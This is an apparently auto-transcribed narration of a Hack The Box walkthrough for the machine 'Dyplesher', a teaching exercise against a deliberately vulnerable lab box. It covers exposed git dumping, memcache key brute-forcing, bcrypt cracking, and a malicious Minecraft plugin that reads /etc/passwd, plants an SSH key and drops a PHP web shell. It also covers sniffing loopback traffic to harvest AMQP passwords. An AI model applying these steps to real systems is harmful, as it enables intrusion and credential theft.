 what's going on youtube this is ipsec i'm doing the pleasure from hack the box and i have no clue if i pronounce that name correctly or not it's just probably about as hard to pronounce as the machine is difficult which means it's a really tough machine but a really cool premise it's all about attacking plugins and you first gain access into the machine by stumbling across a minecraft administration panel that you can upload malicious plugins to you create a java plugin upload to the server and the server executes it and runs your code which is a really cool attack vector that's common almost everywhere like even a wordpress site in order to compromise wordpress site you log in as an admin and you can upload a malicious plugin or upload a malicious theme same with like joomla drupal pretty much any application that supports plugins you can get code execution on the system through the plugin itself because just by what a plugin does extends functionality you can extend but bad functionality too and then once you get on the box i mean there's another system you have to attack i think cube right which uses its own plug-in system using lua lua and you put a malicious lua script there and gain code execution yet again so it sounds a lot easier than it is let's just jump in and take it for a spin as always we're going to start off with the end map however unlike most boxes i haven't ran it ahead of time so this time we're just going to make their end map and i'm going to start off with a full port scan and this is why i didn't want to just start off with the results because i want to show myself doing this piece because i don't do it all that often so i do dash b dash to show all ports dash oa output all formats and then we'll call the file like um all ports and then the ip address which is 10 10 10 190 and because this can take a while i may want to see the results as i find it so i add in that dash v flag so it shows like soon as it finds a report it puts this this is because of that dash v flag and the reason why i want to do a full port scan is because there's ports listing that's not on the top 1000 you don't have to do it because there's hints in the box of what ports to go to but it's always a nice to have so while this scan runs let's just go take a look at the website because it says that it is one at 10 10 10 190. so i'm doing 10 10 10 190 and we get to a page so we have the worst minecraft server i'm looking at the bottom left whenever i highlight a link to see where it goes to and i just see it's going to an anchor tag or a hashtag so it's not really going anywhere look at the forms everything is going to the same place staff goes somewhere else so i click on that and then we also have host test.deplasher.htb so this is a hint that virtual hosts are going on the system so i'm going to sudo vi slash etsy host and then we can do 10 10 10 190 and put the host names close that out and let's take a look at the staff we have three potential users minotau fella moss and yanto i hope i pronounced this correct probably did not um and then we have this little uh icon if we save this icon um let's see where's copy link view image and then save this image oh it tells us it is gogs gogs but i want to see if i can find something real quick i'm just going to save it in downloads let's go to google.com maybe slash images or click the images link and then if you highlight over this maybe it's always there yeah you just have to click this little search by image icon and we can upload an image where it is downloads and there is a lot of stuff in here i probably should clean this out um it was gogs i wanted uploading file and we can see it brings us to gogs.io painless self-hosted git service so it's definitely handy to always be able to use reverse image searches to find applications if you didn't know it so nothing too much there these links don't go anywhere port 8080 doesn't look like it is accessible going back over to our nmap scan it is not finished so let's go take a look at the um depletion.htb same page let's try test.depletio.htb and we get something equal uh add a key and value to memcache so i'm gonna do one and one and send it says equal so let's try one and zero we don't get anything back so let's try um zero one and one and what i'm testing here is i'm trying to understand exactly what the source code is doing um if it's comparing two integers so if it treats each number as like int these two will be equal however if it's treating them as strings then they won't be equal because 0 1 is not the same as 1 in terms of string so that's why i'm going to try this click send and we see equal we can try like zero one with a bunch of zeros and one and that's always going to be equal so the next thing i try is like hex so we try that and we don't get it so i'm not exactly sure how this is going if it was hex then i'd have a better idea because i was assuming it would translate the end of 0x01 which would be just one but it didn't do that uh we could try like one plus one to see if we can get like addition and if we got that as true i'd assume there's probably some type of eval like executing code because it shouldn't ever do math from user input well i guess you could do it but definitely always make sure if like math happens you made the server execute code so you want to try play with other things because chances are they did it in a safe way but if they didn't do a safe way that's how you get code execution all about blind testing is just trying to poke at the web app and discover things that it does and then keep going down paths and bending it against its will i'm doing the squiggly brackets to test for like um server-side template injection and that does not equal so i don't really have anything here um i'm going to run a go buster against this and then we're going to do a n map so let's do go buster dash u actually we gotta put it in der dash u that dash w um opt sec list discovery web content and then what like draft let's do small directories dot text sure that should be fine um the one thing we didn't do we don't know exactly what this is i'm gonna try index.html index.php so this is a php page so i can do x for php to search that argument and probably should do files as well but we'll leave it at directories for now i think dash o is out file so we'll do gobuster.test.out and that's going to run so let's go back to our nmap we can see all the ports that are open and we want to run script scans against these so the way i generally do this is i'll cap the nmap all ports dot nmap file grip it for open and then we're going to do awk dash capital f for field separator do on slash because we just want to grab that and then print one so this gives us all the ports on new lines we can use the ors uh i think it's um something record separator it's probably object uh output record separator is i think what it is so that's just gonna say it's default is newline we're gonna change it to be comma and now it's that if we wanted to put like between two results put a pipe we could so that's output record separator i believe so we can just copy all these ports and then we'll run an nmap again so nmap dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it the pleasure i really hope i am saying that name correct and then we'll add the dash p flag to only scan the ports that are open and let's see we'll forget the ip address so 10 10 10 190 and that should be it go back to a go buster it is still running so we don't have too much we can really be doing we could set up another go buster to do virtual hosts to see if there's other host on this um box since we saw one there may be multiple but i'm just going to let this run and we'll see what happens off camera i checked for the existence of a dot get directory inside of this and it didn't exist so i cheated a little bit i probably want this small words.text so because i'm impatient i just killed that and let's run small words and see what we have um it's giving a bunch of four or threes for random things let's see let's see what that actual error is let's do test.diplasher.php is this just access denied uh forbidden so we'll let this go buster run and see if this finds the director you want i'm almost positive it will unless it's just way too early in the morning for me and i screwed up it's about 10 done and still hasn't finished it but i did notice this terminal it doesn't say nmap anymore so i'm going to go to it since it's finished and we can look at the results so let's nmap uh the plasher dot nmap and we can see everything so it's listening on ssh port 22 and it's in ubuntu box we have oh nmap is telling us there's a dot git repel so let's try downloading this in a second uh port 3000 and we see i like gogs as the cookie so here's the gogs website uh four six three nine i wanna say yeah that's erling then we got rabbit mq we got a lot of ports listening uh one one two one one that is memcache um a minecraft port i think on the uh actual page it mentioned minecraft we just went to the pleasure.htb we have the worst minecraft server so chances are this is actually a minecraft box which is a game i've never played surprisingly so this could be interesting let's go to like dot get to see what we have uh nothing there we do test.the plastic.htb dot get we get a forbidden so that's what i was hunting for with this go buster which it did find it eventually and map does tell us those if we just had ran the script report so let's download this git repo do i have a program here to do it let's ls grep git we do have get dumper so if you don't have this you can probably just google get dumper github and it's a tool to dump git hip git repos that is on github i don't know why i find humor in that but i do so we can just run this tool get dumper.pi it's going to tell us how we need to give it a url and then a directory so i'm going to test the pleasure.htb and then the directory we want is probably going to be home ipsec htb the pleasure and we'll say um git repel and invalid url perhaps you mean http colon slash so it wants to have the actual url so we can put that in and it looks like it is downloading the repel so let's go into that directory get repel and we have the repo here i'm gonna do git log and we can see there's just one commit one file and a readme there are two files one being a readme that is blank so let's look at index.php and we have memcache and we saw a port one one two one one was open so we got credentials here this is sasel authentication and then it's communicating to that and just adding um the two values to memcache so let's try to communicate to this memcache port um if we just do nc101010191211 nothing is going to work because this requires authentication there was a box we did relatively recently with memcache i'm sure you can use ipsec.rocks to find it but um that won't work exactly on this video because of um authentication so i'm going to install the lib lib memcache tools i believe it is let's do search lib memcache see what tools there are this is the repo uh the package i want and this is going to have some tools most importantly it's going to have memcat or memc cat that i like using so we'll do sudo apt install libmem cache tools it looks like it's already installed so let's start begin fuzzing this so um i'm going to make a directory called fuzz and we want to well if we connect to it um we can real quick let's do memc cat dash username thalamos password uh what was the password git repo index here it is dash dash servers 10 10 10 190. so we can connect but we need to know what data to get um i don't know of like a information schema thing in memcache we just need to know the values um let's see is there one for add ads not found um memcache fellow moss and i don't know the protocol well enough to know exactly what it's doing so let's try going back here let's do please subscribe one two three is that going to add this into let's try one two three please subscribe please subscribe try doing both yeah i'm not exactly sure um what we can do on this to not get not found so what i'm going to do is brute force memcache so a lot of my brute forcer tools use websites so that's what i'm going to use i'm going to create index.php and what we're going to do is run system and then paste this and in php to concat two strings it's a period so we can do get cmd like that and now we have a simple php script that will potentially brute force this for us i'm going to start a php web server with php dash capital s 12701 and i'm going to do it with sudo because it defaults to listening on port 80. uh 80. okay maybe it doesn't default to less import eight you have to give it port 80. but now we have this socket running so if i do a curl on localhost we can see undefined index cmd if i do cmd equals please subscribe it's going to run that memcache command with please subscribe and we see it was not found um so let's run w fuzz now so i'm gonna do w fuzz and we can do dash w for word list user share word list and then we're going to oh uh w fuzz let's do opt sec list discovery old habits die hard uh web content i'm just gonna do uh raft small words again and then the url is going to be http 12701 cmd equals fuzz so let's see what this looks like uh we need small words i'm gonna do lowercase dot text there we go and i'm gonna hide everything that is zero words so ctrl c dash dash hw xero and we have now w fuzz running and if it comes across something that is um not zero hopefully it will tell us so i'm gonna speed up the video a little bit until we get a result hopefully we do we'll see and there we go we got password so what i'm going to do is let's go cat fuzz index.php i'm just going to grab this memcat command so grab it here and we'll go and type the word password and we get a few hashes i'm going to type the word username and we get a few uh let's see username password maybe roll group email so we have username passwords and emails there may be more we'll see what that w fuzz says but for now i think we should crack this password so let's go over to the kraken hopefully it's online right now it looks like it is and this is just a box in my basement because i hate doing cracking in a vm you should never crack in a vm if i did on my host well i'm also recording the video on my host and i could have like dropped frames and stuff so it's always good just to get off the box to do cracking because it is very cpu intensive so we'll do depressure probably spelled that incorrectly let's do hash cat dash dash example hashes and this shows everything i happen to know this is going to be a b task just based upon how it looks um like the dollar two characters and then something else and then that to me is always going to be decrypt you can see like dollar to star so this would be like i think an algorithm and this is like the iteration count or something so we'll do 3200 dot slash hash cat dash m 3200 uh we'll do hashes slash flasher opt wordless rock kill and begin cracking let's do s for status to see how long it'll take it says two hours but it's already cracked one uh that's just a testament of how strong b cryptashes are why it says so long thankfully mommy one was near the top and it cracked instantaneously so let's go back to this uh email password so i'm just gonna open up a new pane uh this will be buzzing or we can go back to this pane so we wanted to go back here and i want to run this memcad again to guess what username this is because it's probably going to be an order if we do username password go back to the fuzzing thing 2y12 is um mommy one so that's the second one chances are this is going to be fella moss's password uh can't guarantee it so if we don't get anything we should try them all but the very first one i'm going to try is felimos so let's try ssh thalamos at 10 10 10 190. uh mommy one and it doesn't work we could try them all but i don't waste your time um probably should like do crack map exec or something to speed it up but i'm going to go to the pleasure and port 3000 because from our nmap that told us it was gogs and also from going to the website uh if we just do whoops deplesher and then we go about.php i think it was or let's just why does it keep going to the test i don't want to go to test staff fellow moss is a dev and that's where the gogs was so we should try logging in as him uh thalamos mommy one and we have a few things there is a memcache repel and a gitlab repel looking at these this looks like it is exactly what we have already and then this git lab is just a backup we don't really have anything here but if we look at releases there is one so we can download that download repo.zip and it looks like it is downloading so it's downloaded so let's move that to our directory so maker cogs move downloads repo zip here and we can unzip repo.zip and we got repositories and then some bundle files i'm going to file it to see exactly if it tells me what it is uh we already and repository so we can get that file off and it is a get bundle so let's see if what happens if we just left this file can we even read it is it like a zip format or something so if we less it it's a binary file and it looks like um it's just how a git repo is this is like folder structure there's the head um we can do a get clone dashb master just best buy master branch i don't know if we have to it may default to master let's try it real quick yeah defaults to master and we could look at it um we want to go grab them all what i would do is find dot dash name star bundle that got everything then we can do dash exec get clone dash b master and then open and close squiggly bracket or curly brace is going to take the result from the find and then we just end it with a backslash semicolon and now that's going to go in and clone everything so you now do find dot maybe dash type f and grep dash v get we probably don't want files that have get and we have this knightminer.php we can less it and this just looks like uh something we don't really care about uh php bash we less this uh it's a php bash web shell by arrexel which is a hack the box staff and that is a public repo so if i do php bash github we can see it we may want to uh like download these and md5 some files to see if they're the exact same thing but i'm going to assume they are and we can look at the rest of these and one thing catches my eyes as i scroll up and i see login security users.db and config.yml and this still looks like maybe it looks like game data like um world region uh villages definition files so i'm guessing this is minecraft type stuff i don't know what book it is but yeah i'm guessing this is related to the minecraft theme of this box so let's go and go into this directory where login security is login security and then we can go let's see auth list binary file uh java util hash map uh config.yml it's encryption bcrypt php4 mysql stuff root password nothing else really there if we look at usersdb uh this is sqlite so let's do sqlite 3 users.db we can do schema to see the schema of everything it's got a table user we can also done like dot tables select star from users and we get a another b crypt hash um if you want to put the header on i think you do like dot headers on and now it's going to tell you the um uh columns with your thing so another b cryptash let's go and crack this i'm just going to kill this fuzz because it doesn't look like we need it anymore and we can kill this stop that server and also um when you do that php web server be sure to do localhost because that code was vulnerable as hell you could just done semicolon id or something and execute code so always when you do that type of stuff find a localhost and stop it when you're done um now that that's being said let's go and recrack this hash so v hashes the pleasure to paste this one actually we can just continue on the other one because this is still bcrypt so startup hashcat again and we see it automatically remove the one password it had cracked and it looks like it's about to start just initializing and we get another password very quickly alexis one uh we don't know whose password this is we could try going through gogs and logging in with each user but again that'll probably take like five minutes to do and i don't want to waste your time showing you at all um if we did a go buster on depressure.hdb which we probably should have you should always have recon going in the background you'd see another login endpoint so i'm just going to do that real quick go buster der w opt sec list discovery web content uh what was it raft small words dot text and then paste the url there is a slash login so let's try hitting that so if we go to pleasure login we get a thing that asks for an email address i'm going to try moss at the pleasure dot htv this is what we got from memcache and alexis won i'm putting for the password and it looks like we can log in so looking at this we get looks like some game dashboard uh player feedback nothing too interesting here we can like control you to see if we can see the source to see if the application gives up its name and i don't really see anything but this is just a standard bootstrap theme and you know this if you just build web apps or try to build a web app you notice oh this is just bootstrap we can click on players and we get a few players names i'm not really seeing any way we can interact with it um maybe the search but the search isn't really doing anything it just keeps refreshing this page like if i search for this nothing happens uh we could look at felmas profile all you can do is log out go to console and it looks like it's listing the last 30 lines and nothing too interesting there we go to reload plugin looks like we can load or unload plugins and there's an add plugin and yeah that's about it um i'm pretty sure there's like if we looked more at the get stuff we have like this get repo or not that if we go to gogs and then i think it's the 4e repo like this is hinting at exactly what we need to do this is i believe a plugin if we go into plugins there's nothing here oh there's login security can we see exactly what that is nothing there plug-in metrics nothing there find.grep jar maybe login security is a plugin um let's see unzip login security temp mv login security.jar temp move this to zip yeah this is looking like it is a plug-in so we have maven uh let's see exactly what this is i honestly don't know so let's just google it a free open source software that provides a means to extend uh popular minecraft servers so it looks like we're going to have to create a malicious minecraft plugin because everything on uh the page we got off of staff hints at it being minecraft and there's been a few other hints and it looks like port 3000 is logging into like the admin console of minecraft and plugins looks like it's java code and um it just executes on the server so if we upload a malicious plugin we gain code execution and this like works with almost anything like you can upload a malicious wordpress plugin drupal plugin joomla like any administration panel that allows you to add plugins generally allows you to execute code by a feature just because that's what's needed to um work with plugins so i'm going to switch over to ubuntu to create a plugin mainly because i'm going to install like an ide and we did this before the last time we did java was in the fatty video but because there's some type of configuration and stuff i'm just doing a new machine so you can follow from scratch because i don't know what my main machine is polluted with and also whenever you're doing dev work you may install a bunch of random crap that you don't need that just pollutes this and unless you're like really good about working in python virtual environments and things like that always recommend doing dev on a separate machine so spun up a just blank ubuntu machine and the first thing we're going to want to do is install java so sudo apt install open jdk dash 8 jdk and that's going to install the java development kit so while that installs i'm going to open up firefox and once firefox opens i'm going to open up the ubuntu store so we can install intellij which is an ide we could be using eclipse like we did in the fatty video but um i like showing different things and we'll show intellij this time and maybe next time we do a java thing i'll show vs code and uh yeah vs code's my favorite it's also called codium but i don't know how to do java stuff in it because i hate java so that's why i'm using things that i've done before let's search for whoops that's not what i want to do just type intellij and there's gonna be a few that come up like ultimate educational community i'm gonna pick the community because community normally means free which means it is for me so it's gonna be installing i'm gonna go over to firefox and we're gonna search for a blog post on installing a blank spigot program or spyget i don't know how to pronounce it but big kudos to xerox df for doing it this way um the way i did it was i downloaded a hello world plugin for minecraft did some hacky edits then recompiled it with maven he actually did it the correct way and we talked after the box i like showing i like his way more so that's why i'm showing it this way um doing it like the legitimate way how a developer would do it is definitely more flexible better for troubleshooting and just much better overall like downloading a hello world plugin editing it and then uploading it is hacky but good for time constraints so let's see we want to do spyget uh maven plug-in let's see what this is i'm going to also add pom.xml see creating a plug-in with this is this it this looks like a good article um ubuntu software we have it installed so let's go and launch it it's going to take a little bit for it to pop up this is the guide we're gonna be following i'm gonna probably skip around it like the very first thing we need to copy that palm.xml let's don't send anonymous things and then once this pops oh um that's fine make sure maven is on your build tools it should be because that is default and then just keep clicking next and once um this finishes there's gonna be a button where you can click new project i think it's gonna be right where my cursor is it is click new project and then this is going to take another like 10 to 20 seconds if you don't want to give your vm a lot of memory like i did so now we're just waiting for this to pop up we're going to select on maven and then i don't know what all these archetypes are i'm just gonna click next as soon as these pop up the key thing is the product sdk says java so click next uh let's call this project ipsec and then finish and it should be giving us an environment soon as it prepares this workspace and i think the palm.xml is going to be the first file it lets us edit and that is like um the packages this project is going to use so we have it here i'm going gonna go over here and install this dependency all we do is paste it in underneath the snapshot and then we're going to click this m and we should see or maybe ctrl s to save then click the m see i thought it would be downloading something um in this bottom right it looks like it is still doing something indexing jdk 1.8 i was expecting it to say downloading but maybe it's already done it let's set up the program go to source main java right click on it new and we should have an option that says package we don't so i think this actually has to finish so i'm going to pause the video until this little status bar thing stops right now i'm guessing it's pulling all the functions out of the jdk and now it's going to resolve all the dependencies which are probably going to be in this palm.xml this little bird down here has stopped and if i right click on the java go new we have a few more options but before i do anything i want to see if i can change the font size so i did file settings and i think it's under yep appearance use custom font let's try 16 is this better i didn't change it for where i thought it would because it changed the left side but not on the actual code let's see presentation mode how do i go in presentation mode window uh maybe we just won't be able to do it view appearance and a presentation mode oh that's not what i want how do i get out of this view appearance exit presentation mode okay um i'm going to ignore the font size for now uh my apologies i don't know how to edit it but we got this here we can go to uh source main java new package and we gotta give it a name i'm gonna give it hdb dot the pleasure am i spelling that correctly um let's go back to the box d-y-p-l-e-s-h-e-r d-y-p-l-e it doesn't actually mean anything it's just gonna be how we reference it i'm gonna call it dot ipsec um the main thing that matters is that we're consistent in how we name it so now i have a package hdb depletion ipsec and then the public class ipsec we can go back to this post and um we want to do the extends and then overriding on enable and on disable and that's going to actually allow us to call our code so right now java plugin is in red if we do alt shift enter it's going to automatically put this import statement and everything is good the last thing in this blog tells us to create a plugin.yml file so i'm going to go to resources new file plugin dot yml and then it had a name i'm going to do ipsec uh version is going to be 1.0 and i think the last one was main and it's hdb.thepleasure.ipsec.ips and that's going to be like the entry point in your application so um we're going to execute this jar go into atb to pleasure ipsec and then call the class ipsec that's what that main meant and i think it was main yep so save this i'm just going and pressing ctrl s on everything i've edited out of habit and then going over to maven we can click on plugins and uh oh lifecycle not plugins lifecycle right click on package and build it and we should see it build successfully so we see a build success if we go into a terminal it's going to be in the ideas projects ipsec and then target and we have ipsec 1.0 snapshot.jar so i'm going to do ipaddr to get my ip address it's 172 1610 204. so netcat lvnp 9001 and we're going to direct that file into netcat just an easy way to transfer files make the plugin go in here netcat 172 1610 204 port 9001 to ipsec.jar and then i can control c this it shouldn't take too long to transfer and if we wanted to we can do md5 sum 26 df and we can do md five sum again and we see it begins with 26 ends with df so that looks good copied the file over so let's go and upload it click add and then once it says plugin uploaded we can go to reload plugin type in the name of the plugin which is going to be ipsec and then go to console and hopefully we see a message that says it was enabled uh plugin ipsec has been loaded and enabled and we can see the plugin right here says on enable is called so um that is good we can go back over to our code and edit it to actually do something beneficial to us there is a firewall on the box that you have to kind of you'll find out when reverse shells don't work but in order to minimize time i'm not going to show just doing reverse shells and then having them fail um what we need to do is create a way to read files so i'm going to create a function and it's going to be called read file so public void read file and we're going to give it the file name as an argument and the only exception this could probably throw is an i o exception like if the file doesn't exist or we don't have permission to read the file so we want to do string str line this is going to be um every line in the file so now we can create the buffer reader object and that's going to be essentially like the class that lets us read the file so new file reader fname okay control uh we can do alt enter i think alt enter and alt enter import class do it for everything make sure everything is imported and nothing is red that looks good so now we can loop over the file because this is going to pretty much open the file so we want to loop through every line so while str line or this wire loop is going to be the um uh reading over a file and it's readline uh casing hurts read line like that okay and then if that does not equal null then we want to print the line so it was get logger then dot info sto line and that should be a redline thing so up here right after this on enable we can say try and then read file etsy pass wd like that yep i don't know why that's highlighting in red oh unhandled exception okay so then catch io exception e and then we just want to print the error message so get logger dot info e to string that looks fine um i'm going to label this read etsy passwd and i also want to do one that just says get user name and this will be get logger dot info system get property user dot name and that's highlighting in red y oh we probably need another quote there we go so we've edited this a little bit it should read the etsy pass wd print it out to the text and then print the username so let's go back into our resources plugin.yaml we'll say 1.1 and we will rebuild this and we can md5 summit again see it has changed open up in netcat go back to our cali box send it should uh be sent so ctrl c it i'm going to unload the plugin i don't know if you have to do this but i mean i can't think of a situation where unloading the plug-in before reloading it uh would hurt so just be kind to the application click on this jar add it reload plug-in and hopefully it finds the latest version we have so go to ipsec load go to console and it just says it has been loaded and enabled we don't have anything else we loaded it twice it doesn't look like it loaded the newer version um i'm going to try going to home reset because it says it there if anything happens it's done and then if this doesn't work i will just revert the box i think that's the biggest pain of this box is getting that application to load newer and newer versions of this plugin we could again rename the whole plugin but that's a lot more effort than reverting the box go to console and i don't know what these messages are from but i'm just going to revert the box real quick the box should be reverted by now so i'm just going to go to slash login and then we'll relog into the application maybe it isn't reverted uh let's do 10 10 10 190 login okay it is uh username the password was alexis one maybe i should just click that remember me i wonder if it would actually remember between reverts or save the password uh let's go add plugin browse home hdb home ipsec hdb and then it was the pleasure and plugin click add plugin has been added go to reload and we just type ipsec to load it go to console and we see the contents of etsy passwd and the current user minotaur and we see his home directory is home minitow so chances are we can try writing to his home directory so we want to write like bash rc so maybe a command executes next time he logs in but a better way would be just like trying to write to dot ssh and put an authorized key file there so let's go here and type sh keygen dash f i'm just going to call this ipsec it's going to generate a public and private key and we're going to try to write a key to his directory so let's copy this and when we also write the key to his directory we're going to do multiple things we're going to try writing a php shell to the box as well because um we noticed test.depleture.hdb was a php app so i'm going to try and put an app here for code execution as well because again it's just such a pain to keep uploading this plugin we try to do multiple things at once to minimize the need for having to upload but to drop a file we have to create a new function so this one will be you guessed it public void write file all right oh god i delete way too much there we go right file and it's going to have two arguments string fname and string f contents and just like the last one it's going to throw an i o exception but unlike the last one instead of doing a buffered reader this is buffered writer so we can just do new buffered writer new file writer f name and i think false see control shift enter will that add them all maybe have to go to each one alt enter there we go alt enter there we go so that is there um this one i think is um let's see does it say not null i think that is append or overwrite i think that's what that boolean is um now we can do writer dot write f contents and then we can add a new line just in case it needs it and then close i don't think i needed that yep there we go so now we have a way to write files so there's going to be two files we want to write and i'm going to edit this saying on enable is called it only does 30 lines so we won't actually uh we won't see that because this etsy pass wd i guess i can read etsy remove this now so we don't output all those lines every time so just like the last time try and then write file slash home slash min i think it a-t-o let's see i'm just going to clear my clipboard because i'd hate to make a typo there we go dot ssh authorized keys and then the key name let's go back to our cali box to copy it you actually don't need this piece the last piece here is just for like your own record keeping so you know whose key it is okay uh why is that red is that like an error expected comma cannot resolve test oh i don't have that closed there we go paste awesome syntax highlighting is so nice uh we have to it's just saying it's air because we don't have the um throw yet so we could add that with that catch io uh we can just copy it uh we deleted it we can't copy it so catch io exception then e get logger dot info e dot to string okay so we're writing the ssh key but we also wanted to write a few web shells so i'm going to do that here as well um we can try for string and host v-hosts and i'm writing to multiple files that's why i'm looping this one because if we go back to the box like i'm assuming this is verb dub dub html right now because there's no virtual host but where do you put this directory test.lasher.hdb generally it's going to be instead of dub dub html it's going to be verb dub dub dub either the full name which would be test.depletion.hdb or just test so that's why i'm kind of creating this loop so we can go back here and let's um create the array so the hosts sql two and then html test and then the test.pleasure now this loop probably makes more sense to you um we just call write file var dub dub dub and then plus host because that's going to be the variable i put there and then plus please subscribe dot php and we need to put the file contents so php and then system request uh we'll do cmd okay let me look at this again i'm just going to put this over on my cali box and vim to look at it because again i'd hate making a typo temp dot p php paste so let's see system request cmd that looks good that should work okay so that right file is done we can close the loop i think we already had the loop closed did we okay so i think this is good so what it's going to do is it's going to write the current username then it's going to try to write to minitow's ssh keys to drop this key and then it's also going to loop through html test and test.the pleasure.htb trying to write the file please subscribe.php so let's just pray this works i probably should have looped the exception each time because if one of these fails it's probably going to go to the exception and then not write anything but exploit code is never really pretty code let's copy this netcat again okay we should have it and this time i'm not going to unload the plugin i did that last time and it did not work definition of insanity is trying things over and over expecting different results so this time i'm just going to upload a new plugin and then we'll try to load it and see what happens so plugin is loaded oh we didn't change the version either uh let's see ipsec is already loaded so let's unload it load it again go to console ipsec has been loaded and enabled but um it can etsy wd while it did this username so it's still loading that old plugin i'm going to try redoing it one last time changing the version i'm going to go in this plugin we're going to say 2.0 and does this xml have a version number uh i don't know if i want to change this sure we'll change it what's the worst that can happen i'm pretty sure it's this version number it takes let's run maven build and as soon as it builds recopy should be copied and now let's unload the plugin and load this new one add browse ipsec upload what okay maybe i clicked upload too quick there ipsec go to console and i still think it's loading that old plugin um we could go to like was it please subscribe dot php we get a 404 so i'm guessing it did not want to work so i'm going to revert the box again and we're going to try it it should be revered now so let's just go to slash login again and redo everything maybe it hasn't been reverted there we go so let's do password alexis one that probably should have just saved it then i don't have to type it again but hopefully this is the last time having a log into this application if everything works so load this jar up go to reload plugin and we shouldn't see etsy passwd because that code has been removed if we see it something really bizarre just happened and let's see we have one java i o exception it can't find this directory which is fine because we try to write to three of them so the fact that i don't see three of them i'm happy with so let's try we can refresh this please subscribe and it's actually a page now so we could do cmd equals id and we got a shell and we are part of the wireshark group we can also uh sh well let's do chmod 600 ipsec and use this key sh dash i ipsec at minito tw at 10 10 10 190 and we get in so we got a few directories we got backup which is uh let's see i think we knew what this was this is that memcache thing we were seeing um cat email oh wait cat email cat password cat username so this is just putting information inside of memcache constantly so when we do memcache on our end we could extract the files so there is paper and i don't know what this is what is cube right so we got some things here maybe um this is the application maybe find.grep ipsec because this application is running as minotaur so it's very possible that that's happening um i want to go more into this wireshark so um we do lsla or which tcp dump we see its permissions probably are not set uid however i'm guessing it has the capability set so we can um listen on the wire maybe not is it which t-shirt maybe wireshark uses t-shark git cap user bin t-shock i don't know why that's not giving me any output let's see maybe if we try to find all the files owned by the group wireshark that will help uh that was not expected oh ls devnl so i had a typo in the command and because i am um hiding error messages it didn't tell me i had the bad command so we got this dump capability or a dump cap um lsla well we don't have set uid on it however let's try running git cap on this file for gate capabilities and we have the capability of reading raw packets so this is what we want to do um let's see can we run this dash h to see what options we have so we have um interface duration and output so we are in docker um i should choose what interface we want i'm probably going to try localhost first we could try ens33 but this is going to intercept all the traffic of people communicating this box and create a big capture um could also do each of the dockers but i'm going to try just localhost first so let's do dump cap dash i lo and then w for alp file we can do dev shm out dot pcapp and gonna give it a few minutes pause the video come back and see how many packets we get seeing two packets is definitely good though so it is capturing uh we'll just give it some time to capture a lot of packets we have 108 packets so i think that may be good i'm going to ctrl c out of this we're going to go to dev shm i'm going to base64 out cap dash b or w0 to put it all on one line and we can copy this we can also just scp it with the password we have um we can't do netcat again because of the firewall there are ways to do it and we'll probably go into that at the very end of the video but for now i just like transferring it with uh my good old-fashioned clipboard so we can call this cap.pcap.b64 paste it base64-d on it and just say cap.pcap and we don't have any error messages so i think we got a packet capture it's a pcap ng so we can rename that and then wireshark on the file to see if it has anything juicy we got some dns requests looks like it was trying to do time then we have a bunch of tcp some memcache so let's see what i'm going to do is we're just going to follow stream and we're going to increment the stream and go one by one uh let's see this is memcache we had this so let's go to stream one and we'll see what this is this looks like memcache as well two we got um rabbit mq this is erlang so follow tcp stream uh let's see if we do a hex dump i wonder if this is the erlang cookie to join the cluster um if i remember we're going to poke at this a little bit more because we may have another path to get code execution that's nothing really interesting to us right now though early again four is nothing fives nothing so maybe we should have the capture going a bit longer um let's see did i exit the box i think i did so we can just do sh-i uh we put in plugins ipsec minitow tw at 10 10 10 190. c d dev shm uh let's see was it dump cap dash i l o then dash w for out file out.pcapp i put two p's on it just have to remember that but let's keep going through this wireshark so this dns is not interesting uh we can do not dns okay kind of go through this memcache plane still nothing interesting it's erlang what are you doing oh no not sure exactly what that one is or tcp and then dns again so i don't think we really have anything yet if you want to know more about that erlang thing if for some reason i forget to get to it or it just doesn't work um erling this is the video you'd want to watch so let's see we got 98 files 100 packets so i'm going to do scp dash i plug in ipsec uh let's just move that key to here sa i sh-i ipsec there we go and then we're going to put that or i'll put it copy at 10 10 10 190 then dump dot pcapp with two p's and we want to scp it's devas hm we can it's out.pcapp with two p's one day we'll get the file correct and when we do we can wireshark it to see what type of data is in here i wonder if we could also just uh strings it strings out dot p cap looks like we can so you could also strings it to get a lot of data and this looks interesting what we see here and we see more passwords but i think this is the memcache so let's go back into wireshark this looked more promising so we didn't care for memcache or erlang dns memcache we got something else amqp advanced message queuing protocol so let's follow one of these streams and let's see getting some information but i don't see how this is authenticating but there is definitely a password for yanto and phelamos so let's try logging in with these so we can probably control c this s u let's cat etsy pass wd got his password there so s-u-y-u-n-t-a-o paste the password and we get into him we can do pseudo dash l and he's not pseudoers he doesn't really have anything let's try falamas real quick to see if he has anything different in his home directory always good to try everything instead of just going down like one path all the way try to spread yourself see all the paths then decide what path you want to take this guy looks like he has more files in him and there is a user.txt yanto directory uh let's do sudo dash l still may not run uh sudo what's in this directory send dot sh um hey yunto please publish all cuberite plugins created by players on plugin data exchange and queue just send the url to download plugins and a new code will review and working plugins will be added to their server so looks like it's some hint at um this cube right plugin and yeah let's see if we go back here this is using amqp a message queuing protocol so maybe we have to send a message through whatever this is so let's go to google and search like amqp publish this is rabbitmq let's see search for github simple tool to publish download the latest binary and it gives us kind of instructions how to use it so let's download amqp publish we could also just compile it since it is go and only one file it should be super easy but uh don't have to so let's exit this uh we probably don't need why we did probably need wireshark still but we'll just go back to it um let's move downloads amqp publish to just amqp publish chmod plus x on that and run it do a h and we can um post urls so let's copy this straight from oh wait publish the bar directly to the rabbit queue what's the difference between these two five six seven two so this one's not saying exchange so these look relatively similar i'm going to paste this and we probably need to put credentials and the ip address so let's will be 10 10 10 190. and the admin password we should probably run wireshark so wireshark what was it alt dot pcapp with two p's think that was it should have amqp traffic follow tcp stream and let's see copy yunter's password that's it let's go up y-u-n t-a-l password at that and then let's read his message again so catsend.sh so we want them to be able to hit a url so i'm guessing for the body we're going to put a url so where's body there we go and this body is just going to be http 12701 port 9001 because we should be able to listen on 9001 we can so i'll stamp a web server on this port and he said the exchange so cat send rsh let's see created by players on plug-in data exchange and queue so i think we just put plug-in data on this that dot slash and use name of password is not allowed what we can go back here see follow tcp stream let's try fellow moss with this password and we still don't have anything so let's see gonna rename this ssh to the moss and then we're going to create a new one with um minitow and see if he has any files that would be handy so minito tw at 10 10 10 190. grap dash ri amqp oh god there's a lot of references to amqp control c so what i'm going to do is two things at once number one i'm going to put piece by on this box and log the processes and number two we're going to dig through this wireshark some more so i'm going to google piece by github and we're going to grab this see where is releases here it is and we'll download 64 s for the small version and i will scp it over so scp downloads peace by to minito tw at 10 10 10 190. we'd specify 